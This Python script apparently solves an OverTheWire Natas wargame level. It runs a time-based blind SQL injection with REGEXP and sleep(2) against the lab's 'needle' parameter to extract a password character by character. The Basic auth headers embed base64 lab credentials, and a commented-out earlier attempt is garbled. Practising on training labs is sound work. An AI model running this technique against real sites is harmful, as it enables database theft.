import re
import string
import requests
import time

alphanum = string.ascii_lowercase + string.ascii_uppercase + string.digits

# password = ''
# for char in chars:
#     query = (
#         "SELECT * FROM users WHEN username = 'natas17'"
#             + ("AND password REXEXP \"${password+char}.*$\"" * 100)
#     )[:-1]
#     print(query)
#
#     response = requests.get(
#         "http://natas16.natas.labs.overthewire.org",
#         params = {"needle": query},
#         headers = {"Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="}
#     )
#
#     if(len(response.text) < 1e5):
#         password += char
#         print(password)
#         break

password = ""
while len(password) != 32:
    for char in alphanum:
        print(char)
        query = "natas17\" " + f"AND password REGEXP \"^{password+char}\" AND sleep(2)"

        t0 = time.time()
        response = requests.get(
            "http://natas17.natas.labs.overthewire.org",
            params = {"needle": query},
            headers = {"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}
        )
        dt = time.time() - t0

        # print(response.text)
        print(response.elapsed)
        if response.elapsed.total_seconds() >= 1:
            password += char
            print(password)
            continue

        assert(char != "")
